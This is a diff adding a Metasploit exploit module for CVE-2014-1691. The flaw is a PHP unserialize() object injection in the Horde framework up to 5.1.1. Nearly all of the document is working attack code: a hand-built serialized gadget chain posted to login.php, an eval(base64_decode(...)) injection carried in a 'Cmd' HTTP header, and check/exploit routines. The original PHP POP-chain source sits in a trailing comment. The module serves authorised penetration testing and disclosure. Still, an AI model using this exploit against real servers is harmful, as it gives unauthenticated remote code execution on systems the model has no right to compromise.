@@ -1,0 +1,144 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Horde Framework Unserialize PHP Code Execution',
+      'Description'    => %q{
+        This module exploits a php unserialize() vulnerability in Horde <= 5.1.1 which could be
+        abused to allow unauthenticated users to execute arbitrary code with the permissions of
+        the web server. The dangerous unserialize() exists in the 'lib/Horde/Variables.php' file.
+        The exploit abuses the __destruct() method from the Horde_Kolab_Server_Decorator_Clean
+        class to reach a dangerous call_user_func() call in the Horde_Prefs class.
+      },
+      'Author'         =>
+        [
+          'EgiX', # Exploitation technique and Vulnerability discovery (originally reported by the vendor)
+          'juan vazquez' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2014-1691' ],
+          [ 'URL', 'http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection' ],
+          [ 'URL', 'https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737149' ],
+          [ 'URL', 'https://github.com/horde/horde/commit/da6afc7e9f4e290f782eca9dbca794f772caccb3' ]
+        ],
+      'Privileged'     => false,
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'Targets'        => [ ['Horde 5', { }], ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jun 27 2013'
+      ))
+
+      register_options(
+        [
+          OptString.new('TARGETURI', [ true, "The base path to Horde", "/horde/"])
+        ], self.class)
+  end
+
+  def check
+    flag = rand_text_alpha(rand(10)+20)
+    res = send_request_exploit("print #{flag};die;")
+    if res and res.body and res.body.to_s =~ /#{flag}/
+      return Exploit::CheckCode::Vulnerable
+    end
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status("#{peer} - Testing injection...")
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Failure::NotVulnerable, "#{peer} - Target isn't vulnerable, exiting...")
+    end
+
+    print_status("#{peer} - Exploiting the unserialize()...")
+    send_request_exploit(payload.encoded)
+  end
+
+  def send_request_exploit(p)
+    php_injection = "eval(base64_decode($_SERVER[HTTP_CMD]));die();"
+
+    payload_serialized = "O:34:\"Horde_Kolab_Server_Decorator_Clean\":2:{s:43:\"\x00Horde_Kolab_Server_Decorator_Clean\x00_server\";"
+    payload_serialized << "O:20:\"Horde_Prefs_Identity\":2:{s:9:\"\x00*\x00_prefs\";O:11:\"Horde_Prefs\":2:{s:8:\"\x00*\x00_opts\";a:1:{s:12:\"sizecallback\";"
+    payload_serialized << "a:2:{i:0;O:12:\"Horde_Config\":1:{s:13:\"\x00*\x00_oldConfig\";s:#{php_injection.length}:\"#{php_injection}\";}i:1;s:13:\"readXMLConfig\";}}"
+    payload_serialized << "s:10:\"\x00*\x00_scopes\";a:1:{s:5:\"horde\";O:17:\"Horde_Prefs_Scope\":1:{s:9:\"\x00*\x00_prefs\";a:1:{i:0;i:1;}}}}"
+    payload_serialized << "s:13:\"\x00*\x00_prefnames\";a:1:{s:10:\"identities\";i:0;}}s:42:\"\x00Horde_Kolab_Server_Decorator_Clean\x00_added\";a:1:{i:0;i:1;}}"
+
+    send_request_cgi(
+      {
+        'uri'       => normalize_uri(target_uri.path.to_s, "login.php"),
+        'method'    => 'POST',
+        'vars_post' => {
+          '_formvars' => payload_serialized
+        },
+        'headers' => {
+          'Cmd' => Rex::Text.encode_base64(p)
+        }
+      })
+  end
+end
+
+=begin
+
+PHP chain by EgiX: http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection
+
+class Horde_Config
+{
+   protected $_oldConfig = "phpinfo();die;";
+}
+
+class Horde_Prefs_Scope
+{
+   protected $_prefs = array(1);
+}
+
+class Horde_Prefs
+{
+   protected $_opts, $_scopes;
+
+   function __construct()
+   {
+      $this->_opts['sizecallback'] = array(new Horde_Config, 'readXMLConfig');
+      $this->_scopes['horde'] = new Horde_Prefs_Scope;
+   }
+}
+
+class Horde_Prefs_Identity
+{
+   protected $_prefs, $_prefnames;
+
+   function __construct()
+   {
+      $this->_prefs = new Horde_Prefs;
+      $this->_prefnames['identities'] = 0;
+   }
+}
+
+class Horde_Kolab_Server_Decorator_Clean
+{
+   private $_server, $_added = array(1);
+
+   function __construct()
+   {
+      $this->_server = new Horde_Prefs_Identity;
+   }
+}
+
+$popchain = serialize(new Horde_Kolab_Server_Decorator_Clean);
+
+=end
